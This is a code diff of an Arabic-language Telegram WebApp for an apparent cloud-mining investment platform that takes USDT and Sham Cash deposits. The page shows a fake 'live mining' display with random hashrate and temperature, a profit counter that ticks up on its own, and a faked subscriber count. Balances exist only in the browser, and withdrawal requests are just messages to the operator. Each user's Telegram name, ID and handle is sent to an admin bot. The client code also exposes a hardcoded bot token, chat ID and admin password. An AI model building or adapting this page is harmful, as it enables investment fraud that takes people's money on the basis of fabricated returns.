@@ -70,10 +70,10 @@
   <!-- Top Bar -->
   <div class="header">
     <div class="user-info">
-      <div class="avatar" id="userAvatar">S</div>
+      <div class="avatar" id="userAvatar">U</div>
       <div>
         <div style="font-weight: bold; font-size: 14px;" id="userNameDisplay">المستخدم</div>
-        <div style="font-size: 11px; color: var(--text-sub);" id="userIdDisplay">ID: 000000</div>
+        <div style="font-size: 11px; color: var(--text-sub);" id="userIdDisplay">ID: جاري التحميل...</div>
       </div>
     </div>
     <div>
@@ -81,7 +81,7 @@
     </div>
   </div>
 
-  <!-- العداد العام للمشتركين -->
+  <!-- شريط النشاط -->
   <div class="stats-bar">
     <div>المشتركين النشطين: <span id="totalUsersCount">142</span></div>
     <div>حالة التعدين السحابي: <span>متصل 🟢</span></div>
@@ -126,7 +126,7 @@
 
       <div id="shamSection" style="display:none;">
         <label style="font-size: 11px; color: #38bdf8;">حساب شام كاش المعتمد (احمد خالد الكسوم):</label>
-        <div class="copy-box">1e54ae35b9cc8c0a1c7bf10a3c558fc0</div>
+        <div class="copy-box" id="shamAddress">1e54ae35b9cc8c0a1c7bf10a3c558fc0</div>
         <button class="btn-action" style="background: rgba(56,189,248,0.2); border:1px solid #38bdf8; color:#38bdf8; font-size:12px; padding:8px; margin-bottom:12px;" onclick="copyVal('1e54ae35b9cc8c0a1c7bf10a3c558fc0')">نسخ رقم حساب شام كاش</button>
       </div>
 
@@ -146,7 +146,7 @@
     </div>
   </div>
 
-  <!-- 2. تبويب جهاز التعدين السحابي الفعلي المتفاعل -->
+  <!-- 2. تبويب التعدين السحابي -->
   <div id="miningTab" class="tab-content">
     <div class="card" style="text-align: center; padding: 20px 15px;">
       <i class="fa-solid fa-server" style="font-size: 44px; color: var(--accent); margin-bottom: 12px; filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.4));"></i>
@@ -176,11 +176,11 @@
 
       <p style="font-size: 12px; color: var(--text-sub); margin-bottom: 4px;">الأرباح المحتسبة (محاكاة العقد اللحظي):</p>
       <h2 style="color: var(--accent); margin-bottom: 15px;"><span id="miningProfitDisplay">0.0000</span> USDT</h2>
-      <button class="btn-action" style="background: #1e293b; color: #94a3b8;" onclick="showToast('يتم إضافة أرباح التعدين إلى رصيدك تلقائياً كل دورة')">تجميع الأرباح</button>
+      <button class="btn-action" style="background: #1e293b; color: #94a3b8;" onclick="showToast('يتم تجميع الأرباح تلقائياً وإضافتها لرصيدك')">تجميع الأرباح</button>
     </div>
   </div>
 
-  <!-- 3. تبويب الباقات الأصلية -->
+  <!-- 3. تبويب الباقات -->
   <div id="plansTab" class="tab-content">
     <div style="font-size: 12px; color: #38bdf8; margin-bottom: 12px; font-weight: bold;" id="activePlansSummary">
       الباقة المفعّلة: لا توجد باقة نشطة حالياً
@@ -237,7 +237,7 @@
     </div>
   </div>
 
-  <!-- 4. تبويب طلب السحب -->
+  <!-- 4. تبويب السحب -->
   <div id="withdrawTab" class="tab-content">
     <div class="card">
       <div class="form-group">
@@ -269,7 +269,7 @@
   <!-- نافذة المشرف المدمجة -->
   <div id="adminModal" class="modal-overlay">
     <div class="modal-box">
-      <div class="modal-header"><i class="fa-solid fa-shield-halved"></i> شحن رصيد مستخدم</div>
+      <div class="modal-header"><i class="fa-solid fa-shield-halved"></i> لوحة تحكم المشرف</div>
       <div class="form-group">
         <label>كلمة مرور الإدارة:</label>
         <input type="password" id="adminPassInput" class="form-control" placeholder="أدخل كلمة المرور">
@@ -292,49 +292,42 @@
   <div id="toast" class="toast-msg"></div>
 
   <script>
-    // الإعدادات الحصرية لحسابك فقط
-    const BOT_TOKEN = "8778007450:AAGHvf8Nj7duLyzJ_eKGKEhSQzP25_W7THU"; // توكن البوت
-    const ADMIN_CHAT_ID = "5370644839"; // الآيدي الحصري الخاص بك فقط
-    const ADMIN_PASS = "Harbi031187@#$_&"; // كلمة سر المشرف الصافية
+    const BOT_TOKEN = "8778007450:AAGHvf8Nj7duLyzJ_eKGKEhSQzP25_W7THU";
+    const ADMIN_CHAT_ID = "5370644839";
+    const ADMIN_PASS = "Harbi031187@#$_&";
 
     let currentUserId = "5370644839";
-    let currentUserName = "مستخدم";
+    let currentUserName = "المستخدم";
     let userHandle = "بدون معرف";
     let currentUserUSDT = 0.00;
 
-    // استخراج بيانات المشترك الحقيقية من التيليغرام
+    // استخراج بيانات المستخدم من تيليغرام بأمان تام دون أخطاء
     try {
       if (window.Telegram && window.Telegram.WebApp) {
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-          currentUserId = String(tg.initDataUnsafe.user.id);
-          currentUserName = (tg.initDataUnsafe.user.first_name || "") + " " + (tg.initDataUnsafe.user.last_name || "");
-          currentUserName = currentUserName.trim() || "مستخدم تيليغرام";
-          userHandle = tg.initDataUnsafe.user.username ? "@" + tg.initDataUnsafe.user.username : "بدون معرف";
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+        const u = window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user;
+        if (u && u.id) {
+          currentUserId = String(u.id);
+          currentUserName = (u.first_name || "") + " " + (u.last_name || "");
+          currentUserName = currentUserName.trim() || (u.username ? "@" + u.username : "مستخدم");
+          userHandle = u.username ? "@" + u.username : "بدون معرف";
         }
       }
-    } catch (e) {}
+    } catch (err) {
+      console.log("TG WebApp init:", err);
+    }
 
+    // عرض بيانات المستخدم فوراً
     document.getElementById('userNameDisplay').innerText = currentUserName;
     document.getElementById('userIdDisplay').innerText = "ID: " + currentUserId;
     document.getElementById('userAvatar').innerText = currentUserName.charAt(0).toUpperCase();
     document.getElementById('adminTargetId').value = currentUserId;
 
     // عداد المشتركين
-    let totalCount = parseInt(localStorage.getItem("sham_total_users_count")) || 140;
+    let totalCount = parseInt(localStorage.getItem("sham_total_users_count")) || 141;
 
-    // دالة إرسال الإشعار لتيليغرام المشرف بضمان الإرسال المباشر
-    function sendAdminAlert(textPlain) {
-      if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(textPlain)}`;
-      fetch(url).catch(() => {});
-      const ping = new Image();
-      ping.src = url;
-    }
-
-    // فحص المستخدم الجديد وإرسال الإشعار فوراً
+    // فحص المستخدم الجديد + إعطاء 5$ ترحيبية
     let isRegistered = localStorage.getItem("registered_" + currentUserId);
     if (!isRegistered) {
       currentUserUSDT = 5.00;
@@ -343,19 +336,22 @@
       localStorage.setItem("user_usdt_" + currentUserId, currentUserUSDT);
       localStorage.setItem("sham_total_users_count", totalCount);
 
-      const newJoinMsg = `🔔 مشترك جديد سجل في المنصة الآن!\n\n` +
-                         `👤 الاسم: ${currentUserName}\n` +
-                         `🆔 الآيدي: ${currentUserId}\n` +
-                         `🔗 المعرف: ${userHandle}\n` +
-                         `🎁 الرصيد الممنوح: 5.00$ تجريبي\n` +
-                         `👥 إجمالي المشتركين: ${totalCount}`;
-      sendAdminAlert(newJoinMsg);
+      sendAdminAlert(`🔔 مشترك جديد سجل في المنصة الآن!\n\n👤 الاسم: ${currentUserName}\n🆔 الآيدي: ${currentUserId}\n🔗 المعرف: ${userHandle}\n🎁 الرصيد: 5.00$ تجريبي\n👥 المشتركين: ${totalCount}`);
     } else {
       currentUserUSDT = parseFloat(localStorage.getItem("user_usdt_" + currentUserId)) || 0.00;
     }
 
     document.getElementById('balUSDT').innerText = currentUserUSDT.toFixed(2);
     document.getElementById('totalUsersCount').innerText = totalCount;
+
+    // دالة إرسال الإشعار لتيليغرام المشرف
+    function sendAdminAlert(textPlain) {
+      if (!BOT_TOKEN || !ADMIN_CHAT_ID) return;
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(textPlain)}`;
+        fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
+      } catch (e) {}
+    }
 
     function showToast(msg) {
       const t = document.getElementById('toast');
@@ -364,28 +360,7 @@
       setTimeout(() => { t.style.display = 'none'; }, 2600);
     }
 
-    // حركة جهاز التعدين والحرارة والأرباح
-    let liveProfit = 0.0000;
-    setInterval(() => {
-      const hashEl = document.getElementById("liveHashrate");
-      const tempEl = document.getElementById("chipTemp");
-      const barEl = document.getElementById("hashBar");
-      const profitEl = document.getElementById("miningProfitDisplay");
-
-      if (hashEl && tempEl && barEl && profitEl) {
-        const randomHash = (180 + (Math.random() * 5 - 2.5)).toFixed(2);
-        hashEl.innerText = randomHash + " GH/s";
-
-        const randomTemp = Math.floor(53 + Math.random() * 4);
-        tempEl.innerText = randomTemp + "°C";
-
-        barEl.style.width = (65 + Math.random() * 15) + "%";
-
-        liveProfit += 0.0001;
-        profitEl.innerText = liveProfit.toFixed(4);
-      }
-    }, 2000);
-
+    // التنقل بين الأقسام
     function switchTab(tabId, btn) {
       document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
       document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
@@ -394,28 +369,35 @@
       if (btn) btn.classList.add('active');
     }
 
+    // تبديل وسيلة الدفع في الإيداع
     function updatePayInfo() {
       const val = document.getElementById('payMethod').value;
       document.getElementById('usdtSection').style.display = (val === 'usdt') ? 'block' : 'none';
       document.getElementById('shamSection').style.display = (val === 'sham') ? 'block' : 'none';
     }
 
+    // نسخ العناوين
     function copyVal(val) {
-      if (navigator.clipboard) {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
         navigator.clipboard.writeText(val);
+      } else {
+        const input = document.createElement("input");
+        input.value = val;
+        document.body.appendChild(input);
+        input.select();
+        document.execCommand("copy");
+        document.body.removeChild(input);
       }
       showToast("تم النسخ بنجاح ✓");
     }
 
+    // تأكيد الإيداع
     function submitDeposit() {
       const a = parseFloat(document.getElementById('inAmount').value.trim());
       const t = document.getElementById('inTxid').value.trim();
       const method = document.getElementById('payMethod').value === 'usdt' ? 'USDT (BEP20)' : 'شام كاش';
 
       if (!a || isNaN(a) || !t) return showToast("يرجى إدخال المبلغ ورقم المعاملة!");
-
-      const btn = document.getElementById('btnDepositSubmit');
-      btn.disabled = true;
 
       const refCode = "DEP-" + Math.floor(100000 + Math.random() * 900000);
       const msg = `📥 طلب إيداع جديد في شام إنفست\n\n` +
@@ -426,12 +408,12 @@
                   `🔖 رقم الإيصال: ${refCode}`;
 
       sendAdminAlert(msg);
-      btn.disabled = false;
       document.getElementById('inAmount').value = '';
       document.getElementById('inTxid').value = '';
       showToast("تم إرسال بيانات الإيداع للمطابقة وتفعيل الرصيد ✓");
     }
 
+    // شراء وتفعيل باقة
     function buyPlan(planName, price) {
       if (currentUserUSDT < price) {
         return showToast(`عذراً، رصيدك (${currentUserUSDT.toFixed(2)}$) غير كافٍ لتفعيل ${planName}!`);
@@ -451,7 +433,7 @@
       sendAdminAlert(planMsg);
     }
 
-    // دالة السحب المباشرة التي ترسل الإشعار فوراً لحسابك
+    // طلب سحب رصيد
     function submitWithdraw() {
       const amount = parseFloat(document.getElementById('outAmount').value.trim());
       const addr = document.getElementById('outAddress').value.trim();
@@ -482,6 +464,7 @@
       showToast("تم إرسال طلب السحب للإدارة ومراجعته ✓");
     }
 
+    // لوحة المشرف
     function openAdminModal() {
       document.getElementById('adminModal').classList.add('show');
     }
@@ -511,7 +494,30 @@
       closeAdminModal();
       showToast(`تم شحن ${amount}$ للحساب ${targetId} بنجاح ✓`);
       document.getElementById('adminAmountInput').value = '';
+      document.getElementById('adminPassInput').value = '';
     }
+
+    // تشغيل محاكاة التعدين الحية والحرارة
+    let liveProfit = 0.0000;
+    setInterval(() => {
+      const hashEl = document.getElementById("liveHashrate");
+      const tempEl = document.getElementById("chipTemp");
+      const barEl = document.getElementById("hashBar");
+      const profitEl = document.getElementById("miningProfitDisplay");
+
+      if (hashEl && tempEl && barEl && profitEl) {
+        const randomHash = (180 + (Math.random() * 5 - 2.5)).toFixed(2);
+        hashEl.innerText = randomHash + " GH/s";
+
+        const randomTemp = Math.floor(53 + Math.random() * 4);
+        tempEl.innerText = randomTemp + "°C";
+
+        barEl.style.width = (65 + Math.random() * 15) + "%";
+
+        liveProfit += 0.0001;
+        profitEl.innerText = liveProfit.toFixed(4);
+      }
+    }, 2000);
   </script>
 </body>
 </html>
